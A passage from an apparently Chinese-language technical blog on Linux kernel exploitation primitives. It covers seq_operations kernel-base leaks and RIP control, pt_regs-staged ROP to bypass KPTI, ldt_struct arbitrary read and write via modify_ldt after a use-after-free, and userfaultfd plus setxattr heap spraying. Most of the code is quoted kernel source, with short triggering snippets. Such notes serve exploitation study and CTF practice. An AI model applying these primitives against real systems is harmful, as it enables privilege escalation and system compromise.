perror(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="seq-operations-leak-attack"><a href="#seq-operations-leak-attack" class="headerlink" title="seq_operations leak+attack"></a>seq_operations leak+attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x20(kmalloc-32) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>start，stop，next，show：这4个函数都可以泄露 kernel_base</li>
<li>start：重写 start 变量并调用 read，就可以成功控制 rip</li>
</ul>
<p>当我们 <code>read</code> 一个 <code>stat</code> 文件时，内核会调用 <code>proc_ops-&gt;proc_read_iter</code> 指针 </p>
<p>使用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> victim = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">read(victim, buf, <span class="number">1</span>); <span class="comment">// call start</span></span><br></pre></td></tr></table></figure>
<h2 id="pt-regs-seq-operations-Bypass-KPTI"><a href="#pt-regs-seq-operations-Bypass-KPTI" class="headerlink" title="pt_regs + seq_operations Bypass KPTI"></a>pt_regs + seq_operations Bypass KPTI</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>用以在 Kernel Stack 中保存异常发生时的现场寄存器信息，其具体定义与 CPU 架构相关</p>
<ul>
<li>在调用 SYSCALL 时，内核会将 <code>pt_regs</code> 结构体压栈</li>
<li>PS：内核发生异常时，输出的 debug 信息就是通过 <code>show_regs(regs)</code> 来打印的 </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	/* 将用户栈偏移保存到per-cpu变量rsp_scratch中 */</span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">	/* 在栈中倒序构建struct pt_regs */ </span><br><span class="line">	pushq	$__USER_DS				/* pt_regs-&gt;ss */</span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs-&gt;sp */</span><br><span class="line">	pushq	%r11					/* pt_regs-&gt;flags */</span><br><span class="line">	pushq	$__USER_CS				/* pt_regs-&gt;cs */</span><br><span class="line">	pushq	%rcx					/* pt_regs-&gt;ip */</span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					/* pt_regs-&gt;orig_ax */</span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	/* 保存参数到寄存器,调用do_syscall_64函数 */</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		/* returns with IRQs disabled */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	如果我们要返回到完全干净的64位用户空间上下文,请尝试使用SYSRET而不是IRET</span><br><span class="line">	如果我们不是,请转到缓慢的退出路径</span><br><span class="line">	 */</span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	/* SYSRET requires RCX == RIP */</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_X86_5LEVEL</span><br><span class="line">	ALTERNATIVE &quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;, \</span><br><span class="line">		&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;, X86_FEATURE_LA57</span><br><span class="line">#else</span><br><span class="line">	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><br><span class="line">	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	/* 如果这改变了%rcx,它不是规范的 */</span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		/* R11 == RFLAGS */</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	/* nothing to check for RSP */</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		/* SS must match SYSRET */</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	/* RCX和R11已经恢复(见上面的代码) */</span><br><span class="line">	POP_REGS pop_rdi=0 skip_r11rcx=1</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	现在,除RSP和RDI之外的所有寄存器都已恢复</span><br><span class="line">	保存旧的stack指针并切换到trampoline stack</span><br><span class="line">	 */</span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	/* RSP */</span><br><span class="line">	pushq	(%rdi)		/* RDI */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	我们在trampoline stack上,除RDI之外的所有寄存器都是实时的</span><br><span class="line">	我们可以在这里做未来的最终退出工作</span><br><span class="line">	 */</span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	USERGS_SYSRET64</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>
<ul>
<li>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15</li>
<li>这些寄存器为我们布置 ROP 链提供了可能</li>
</ul>
<p>利用：</p>
<ul>
<li>通常和 <code>seq_operations</code> 配合使用</li>
<li>使用 <code>__asm__</code> 操控寄存器，然后在末尾写入一个 <code>syscall</code> 用于调用 <code>read(seq_fd,rsp,8)</code> 以触发 <code>seq_operations-&gt;start</code>（需要再此处设置一个类似于 <code>add rsp, xxx; ret;</code> 的 Gadget 来将控制流迁移到我们的 ROP 上）</li>
<li>此时 <code>pt_regs</code> 压栈，同时也将我们布置的 ROP 压栈，<code>seq_operations-&gt;start</code> 上的 Gadget 用于完成迁移</li>
<li>PS：由于 <code>read(seq_fd,rsp,8)</code> 会破坏我们布置的 <code>pt_regs</code> 结构，因此具体的 ROP 链需要根据调试信息进行微调</li>
</ul>
<h2 id="ldt-struct-RAA-WAA"><a href="#ldt-struct-RAA-WAA" class="headerlink" title="ldt_struct RAA + WAA"></a>ldt_struct RAA + WAA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_entries;</span><br><span class="line">	<span class="keyword">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在局部段描述符表中有许多的段描述符，用 <code>desc_struct</code> 进行描述：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><strong>RAA</strong></p>
<p>Linux 提供了 <code>modify_ldt</code> 系统调用，用于获取或修改当前进程的 LDT</p>
<ul>
<li>内核源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount); <span class="comment">/* 内核任意地址读 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>); <span class="comment">/* 分配新的ldt_struct结构体 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中我们可以利用的两个函数就是 <code>read_ldt</code> 和 <code>write_ldt</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>劫持 <code>mm-&gt;context.ldt-&gt;entries</code> 就可以实现任意读（<code>ldt_struct-&gt;entries</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">	old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">	new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">	error = -ENOMEM;</span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries); <span class="comment">/* 为新的ldt_struct分配空间 */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct ldt_struct *<span class="title">alloc_ldt_struct</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	new_ldt = kmalloc(<span class="keyword">sizeof</span>(struct ldt_struct), GFP_KERNEL);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>write_ldt</code> 中会调用 <code>alloc_ldt_struct</code>，然后执行一个 <code>kmalloc</code>（可以被 UAF 控制）</li>
</ul>
<p>利用 <code>modify_ldt</code> 泄露内核地址的思路如下：</p>
<ul>
<li>申请并释放有 UAF 的堆块</li>
<li>执行 <code>write_ldt</code>，使在 <code>alloc_ldt_struct</code> 中申请的 <code>ldt_struct</code> 填充 UAF 堆块</li>
<li>利用 UAF 控制 <code>ldt_struct-&gt;entries</code>，然后使用 <code>read_ldt</code> 把数据读到用户态</li>
</ul>
<p>在实际的利用中，只能在 <code>ldt_struct-&gt;entries</code> 中爆破数据</p>
<ul>
<li>命中无效的地址：<code>copy_to_user</code> 返回非 0 值，此时 <code>read_ldt</code> 的返回值便是 <code>-EFAULT</code></li>
<li>命中内核空间：<code>read_ldt</code> 执行成功</li>
</ul>
<p>但我们不能直接爆破内核基地址，只能先爆破线性映射区 <code>direct mapping area</code>（kmalloc 使用的空间），然后通过 <code>read_ldt</code> 在堆上读取一些可利用的内核指针并泄露内核基地址</p>
<ul>
<li>通常情况下内核会开启 <code>hardened usercopy</code> 保护，当 <code>copy_to_user</code> 的源地址为内核 <code>.text</code> 段（包括 <code>_stext</code> 和 <code>_etext</code>）时会引起 <code>kernel panic</code></li>
<li>一般情况下 <code>page_offset_base + 0x9d000</code> 处固定存放着 <code>secondary_startup_64</code> 函数的地址（<code>kernel_base = secondary_startup_64 - 0x40</code>）</li>
</ul>
<p><strong>WAA（不推荐）</strong></p>
<p>利用条件竞争可以在 <code>write_ldt</code> 中实现任意写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>基础的逻辑为：<ul>
<li>新申请一个 <code>ldt_struct</code></li>
<li>执行 <code>memcpy</code> 把旧的 <code>ldt_struct</code> 数据拷贝到新的 <code>ldt_struct</code> 中</li>
</ul>
</li>
<li>注意最后一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code><ul>
<li><code>ldt</code> 是我们写入的数据</li>
</ul>
</li>
<li>通过条件竞争的方式在 <code>memcpy</code> 过程中将 <code>new_ldt-&gt;entries</code> 更改为我们的目标地址从而完成任意地址写，即 Double Fetch </li>
</ul>
<h2 id="userfaultfd-setxattr"><a href="#userfaultfd-setxattr" class="headerlink" title="userfaultfd + setxattr"></a>userfaultfd + setxattr</h2><p>userfaultfd 是 Linux 的一个系统调用，使用户可以通过自定义的页处理程序 page fault handler 在用户态处理缺页异常</p>
<p>setxattr 在 kernel 中可以为我们提供近乎任意大小的内核空间 object 分配</p>
<ul>
<li>调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr() -&gt; path_setxattr() -&gt; setxattr()</span><br></pre></td></tr></table></figure>
<ul>
<li>核心代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">/* 分配object */</span></span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123; <span class="comment">/* 向内核写入内容 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue); <span class="comment">/* 释放object */</span></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么这里 setxattr 系统调用便提供给我们这样一条调用链：</p>
<ul>
<li>在内核空间分配 object</li>
<li>向 object 内写入内容</li>
<li>释放分配的 object</li>
</ul>
<p>这里的 value 和 size 都是由我们来指定的，即我们可以分配任意大小的 object 并向其中写入内容</p>
<p>堆占位技术就是用 setxattr 和 userfaultfd 配合使用得来的，可以在内核空间中分配任意大小的 object 并写入任意内容 </p>
<p>在 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，通过这一点可以构造出如下的利用：</p>
